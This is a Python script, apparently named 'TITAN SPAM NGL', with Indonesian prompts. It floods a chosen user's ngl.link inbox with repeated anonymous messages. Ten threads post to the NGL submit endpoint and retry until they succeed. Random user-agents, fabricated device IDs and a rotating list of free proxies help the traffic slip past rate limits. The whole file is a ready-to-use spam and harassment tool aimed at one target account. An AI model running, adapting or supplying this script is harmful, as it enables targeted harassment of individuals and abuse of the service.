#!/usr/bin/env python3
import requests
import time
import threading
import random
import os
from datetime import datetime

G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[0m'

os.system('clear')

banner = f"""
{C}╔═══════════════════════════════════════════╗
║       🔥 TITAN SPAM NGL 🔥                 ║
║    Created by : @Barxzzz                   ║
║    Mode       : 100% Work + Proxy         ║
╚═══════════════════════════════════════════╝{W}
"""
print(banner)

target = input(f"{G}[?] Target (username NGL): {W}")
pesan = input(f"{G}[?] Pesan: {W}")
jumlah = int(input(f"{G}[?] Jumlah: {W}"))
menit = int(input(f"{G}[?] Menit: {W}"))

# Endpoint
endpoints = [
    "https://ngl.link/api/submit",
    "https://ngl.link/api/submit",
    "https://ngl.link/api/submit"
]

# User-Agent acak
uas = [
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.80 Mobile Safari/537.36"
]

# Proxy list (gratis)
proxy_list = [
    "http://103.150.102.2:8080",
    "http://103.150.102.3:8080",
    "http://103.150.102.4:8080",
    "http://103.150.102.5:8080",
    "http://103.150.102.6:8080",
    "http://103.150.102.7:8080",
    "http://103.150.102.8:8080",
    "http://103.150.102.9:8080",
    "http://103.150.102.10:8080",
    "http://103.150.102.11:8080",
    "http://103.150.102.12:8080",
    "http://103.150.102.13:8080",
    "http://103.150.102.14:8080",
    "http://103.150.102.15:8080"
]

counter = 0
success = 0
failed = 0
lock = threading.Lock()
stop_event = threading.Event()

def kirim_spam():
    global counter, success, failed
    while not stop_event.is_set():
        with lock:
            if counter >= jumlah:
                stop_event.set()
                break
            counter += 1

        # Coba sampai berhasil
        while not stop_event.is_set():
            try:
                endpoint = random.choice(endpoints)
                ua = random.choice(uas)
                proxy = random.choice(proxy_list)

                data = {
                    "username": target,
                    "question": pesan,
                    "deviceId": f"titan_{random.randint(10000,99999)}_{int(time.time())}"
                }

                headers = {
                    "User-Agent": ua,
                    "Accept": "application/json",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Origin": "https://ngl.link",
                    "Referer": "https://ngl.link/"
                }

                r = requests.post(
                    endpoint,
                    data=data,
                    headers=headers,
                    proxies={"http": proxy, "https": proxy},
                    timeout=15
                )

                if r.status_code == 200:
                    with lock:
                        success += 1
                    print(f"{G}[✓] Spam ke-{counter} TERKIRIM!{W}")
                    break  # keluar dari loop retry
                else:
                    print(f"{Y}[!] Retry {counter} (HTTP {r.status_code})...{W}")
                    time.sleep(0.2)

            except Exception as e:
                print(f"{R}[!] Error: {str(e)[:20]} - retry...{W}")
                time.sleep(0.2)

        time.sleep(0.05)

print(f"\n{G}[+] START SPAM 100% WORK{W}")
print(f"{G}[+] Target: @{target}{W}")
print(f"{G}[+] Pesan: {pesan}{W}")
print(f"{G}[+] Target: {jumlah} spam dalam {menit} menit{W}")
print(f"{G}[+] Proxy aktif: {len(proxy_list)} proxy{W}")
print(f"{G}[+] 10 thread paralel{W}\n")

for _ in range(10):
    t = threading.Thread(target=kirim_spam)
    t.daemon = True
    t.start()

timeout = menit * 60
time.sleep(timeout)
stop_event.set()

print(f"\n{G}═══════════════════════════════════════════{W}")
print(f"{G}[✓] SELESAI!{W}")
print(f"{G}[✓] Berhasil: {success}{W}")
print(f"{R}[✗] Gagal   : {failed}{W}")
print(f"{G}[✓] Total   : {success + failed}{W}")
print(f"{G}═══════════════════════════════════════════{W}")
